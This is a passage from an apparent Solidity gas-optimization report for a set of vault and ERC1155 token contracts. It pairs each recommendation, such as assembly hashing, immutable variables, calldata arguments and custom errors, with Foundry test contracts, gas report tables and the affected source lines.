├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 42693                  ┆ 244             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ safeUncheckedPlusPlusI ┆ 1355            ┆ 1355 ┆ 1355   ┆ 1355 ┆ 1       │ ╰────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract2 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 35887              ┆ 210             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ uncheckedPlusPlusI ┆ 1329            ┆ 1329 ┆ 1329   ┆ 1329 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract4 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 26881              ┆ 164             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ inlineAssemblyLoop ┆ 709             ┆ 709 ┆ 709    ┆ 709 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines - FERC1155.sol:339  - FERC1155.sol:363  - Vault.sol:78  - Vault.sol:104  - Migration.sol:89  - VaultRegistry.sol:172   --- ## Use assembly to hash instead of Solidity  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.solidityHash(2309349, 2304923409);         c1.assemblyHash(2309349, 2304923409);     } }  contract Contract0 {     function solidityHash(uint256 a, uint256 b) public view {         //unoptimized         keccak256(abi.encodePacked(a, b));     } }  contract Contract1 {     function assemblyHash(uint256 a, uint256 b) public view {         //optimized         assembly {             mstore(0x00, a)             mstore(0x20, b)             let hashedVal := keccak256(0x00, 0x40)         }     } } ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 36687              ┆ 214             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ solidityHash       ┆ 313             ┆ 313 ┆ 313    ┆ 313 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 31281              ┆ 186             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyHash       ┆ 231             ┆ 231 ┆ 231    ┆ 231 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```   ### Lines - FERC1155.sol:332  - FERC1155.sol:357  - FERC1155.sol:373  - FERC1155.sol:376  - FERC1155.sol:377  - FERC1155.sol:394  - Buyout.sol:456  - VaultFactory.sol:38  - VaultFactory.sol:46  - VaultFactory.sol:66  - Vault.sol:60  - Minter.sol:26   ---  ## Mark storage variables as `immutable` if they never change after contract initialization.  State variables can be declared as constant or immutable. In both cases, the variables cannot be modified after the contract has been constructed. For constant variables, the value has to be fixed at compile-time, while for immutable, it can still be assigned at construction time.  The compiler does not reserve a storage slot for these variables, and every occurrence is inlined by the respective value.  Compared to regular state variables, the gas costs of constant and immutable variables are much lower. For a constant variable, the expression assigned to it is copied to all the places where it is accessed and also re-evaluated each time. This allows for local optimizations. Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed. For these values, 32 bytes are reserved, even if they would fit in fewer bytes. Due to this, constant values can sometimes be cheaper than immutable values.   ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2  c2;          function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();              }      function testGas() public view {         c0.addValue();         c1.addImmutableValue();         c2.addConstantValue();     } }  contract Contract0 {     uint256 val;      constructor() {         val = 10000;     }      function addValue() public view {         uint256 newVal = val + 1000;     } }  contract Contract1 {     uint256 immutable val;      constructor() {         val = 10000;     }      function addImmutableValue() public view {         uint256 newVal = val + 1000;     } }  contract Contract2 {     uint256 constant val = 10;      function addConstantValue() public view {         uint256 newVal = val + 1000;     } }  ```  ### Gas Report ```js ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 54593              ┆ 198             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addValue           ┆ 2302            ┆ 2302 ┆ 2302   ┆ 2302 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 38514              ┆ 239             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addImmutableValue  ┆ 199             ┆ 199 ┆ 199    ┆ 199 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract2 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 32287              ┆ 191             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addConstantValue   ┆ 199             ┆ 199 ┆ 199    ┆ 199 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines - Buyout.sol:29  - Buyout.sol:31  - Buyout.sol:33  - VaultFactory.sol:15  - Minter.sol:14  - Migration.sol:37  - Migration.sol:39  - BaseVault.sol:19   ---  ## Use `calldata` instead of `memory` for function arguments that do not get mutated. Mark data types as `calldata` instead of `memory` where possible. This makes it so that the data is not automatically loaded into memory. If the data passed into the function does not need to be changed (like updating values in an array), it can be passed in as `calldata`. The one exception to this is if the argument must later be passed into another function that takes an argument that specifies `memory` storage.    ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();     }      function testGas() public {         uint256[] memory arr = new uint256[](10);         c0.calldataArray(arr);         c1.memoryArray(arr);          bytes memory data = abi.encode("someText");         c2.calldataBytes(data);         c3.memoryBytes(data);     } }  contract Contract0 {     function calldataArray(uint256[] calldata arr) public {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract1 {     function memoryArray(uint256[] memory arr) public {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract2 {     function calldataBytes(bytes calldata data) public {         bytes32 val;         for (uint256 i; i < 10; i++) {             val = keccak256(abi.encode(data, i));         }     } }  contract Contract3 {     function memoryBytes(bytes memory data) public {         bytes32 val;         for (uint256 i; i < 10; i++) {             val = keccak256(abi.encode(data, i));         }     } } ```  ### Gas Report ```js ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 97947                                     ┆ 521             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ calldataArray                             ┆ 2824            ┆ 2824 ┆ 2824   ┆ 2824 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 128171                                    ┆ 672             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ memoryArray                               ┆ 3755            ┆ 3755 ┆ 3755   ┆ 3755 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract2 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 100547                                    ┆ 534             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ calldataBytes                             ┆ 4934            ┆ 4934 ┆ 4934   ┆ 4934 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract3 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 135183                                    ┆ 707             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ memoryBytes                               ┆ 7551            ┆ 7551 ┆ 7551   ┆ 7551 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯  ``` ### Lines - FERC1155.sol:68  - FERC1155.sol:83  - FERC1155.sol:261  - Metadata.sol:24  - Multicall.sol:39  - Vault.sol:73  - Vault.sol:101  - Vault.sol:142  - MerkleBase.sol:45  - MerkleBase.sol:125  - Migration.sol:487  - VaultRegistry.sol:53  - VaultRegistry.sol:54  - VaultRegistry.sol:70  - VaultRegistry.sol:71  - VaultRegistry.sol:85  - VaultRegistry.sol:86  - VaultRegistry.sol:105  - VaultRegistry.sol:106  - VaultRegistry.sol:150  - VaultRegistry.sol:151  - VaultRegistry.sol:168  - VaultRegistry.sol:169   --- ## Use custom errors instead of string error messages  ```js contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testFailGas() public {         c0.stringErrorMessage();         c1.customErrorMessage();     } }  contract Contract0 {     function stringErrorMessage() public {         bool check = false;         require(check, "error message");     } }  contract Contract1 {     error CustomError();      function customErrorMessage() public {         bool check = false;         if (!check) {             revert CustomError();         }     } }  ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 34087              ┆ 200             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ stringErrorMessage ┆ 218             ┆ 218 ┆ 218    ┆ 218 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 26881              ┆ 164             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ customErrorMessage ┆ 161             ┆ 161 ┆ 161    ┆ 161 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines - FERC1155.sol:267  - FERC1155.sol:285  - FERC1155.sol:297  - MerkleBase.sol:62  - MerkleBase.sol:78   --- ## Use assembly to check for address(0)  ```js   contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.ownerNotZero(address(this));         c1.assemblyOwnerNotZero(address(this));     } }  contract Contract0 {     function ownerNotZero(address _addr) public pure {         require(_addr != address(0), "zero address)");     } }  contract Contract1 {     function assemblyOwnerNotZero(address _addr) public pure {         assembly {             if iszero(_addr) {                 mstore(0x00, "zero address")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 61311              ┆ 338             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ ownerNotZero       ┆ 258             ┆ 258 ┆ 258    ┆ 258 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭──────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract   ┆                 ┆     ┆        ┆     ┆         │ ╞══════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost      ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 44893                ┆ 255             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name        ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyOwnerNotZero ┆ 252             ┆ 252 